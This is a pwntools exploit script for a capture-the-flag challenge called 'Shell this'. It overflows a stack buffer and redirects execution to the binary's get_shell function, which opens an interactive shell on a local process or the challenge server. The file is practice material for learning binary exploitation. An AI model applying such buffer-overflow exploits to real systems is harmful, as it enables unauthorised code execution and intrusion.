from pwn import *

"""
Shell this (100)

Somebody told me that this program is vulnerable to something called remote code execution?

I'm not entirely sure what that is, but could you please figure it out for me?

nc chal.duc.tf 30002
"""


BINARY = './shellthis'
context.binary = BINARY
GDB = False
REMOTE = False
e = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    REMOTE = True

def start():
    if REMOTE:
        return remote("chal.duc.tf", 30002)
    else:
        if GDB:
            return gdb.debug(BINARY, '''
                break main
                continue
            ''')
        else:
            return process(BINARY)


def exploit():
    try:
        io = start()
        io.readline()
        p = b"A"*cyclic_find(0x6161616f)
        p += pack(e.functions['get_shell'].address)
        io.sendline(p)
        io.interactive()
    finally:
        io.close()

exploit()
